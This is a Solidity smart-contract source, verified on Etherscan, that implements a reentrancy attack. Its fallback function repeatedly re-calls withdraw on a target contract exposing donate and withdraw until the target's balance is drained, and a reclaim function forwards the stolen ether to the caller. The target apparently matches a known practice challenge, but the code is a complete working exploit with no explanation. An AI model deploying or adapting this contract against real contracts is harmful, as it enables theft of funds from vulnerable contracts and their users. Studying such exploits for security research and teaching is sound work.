/**
 *Submitted for verification at Etherscan.io on 2022-11-30
*/

contract Exploit {
    IReentrance public re;
    uint256 private constant ETHER_FRACTION = 100_000_000_000_000;

    constructor (IReentrance _re) public payable{
        re=_re;
    }
    fallback()external payable{
        if(address(re).balance > 0){
          re.withdraw(ETHER_FRACTION);
        }
    }

    function attack() external payable{
        re.donate{value: ETHER_FRACTION}(address(this));
        re.withdraw(ETHER_FRACTION);
    }

    function reclaim () external payable{
      (bool result,) = msg.sender.call{value: address(this).balance}("");
      if(result){
          result;
      }
    }
}

interface IReentrance {
  function withdraw(uint _amount) external;
  function donate(address _to) external payable;
}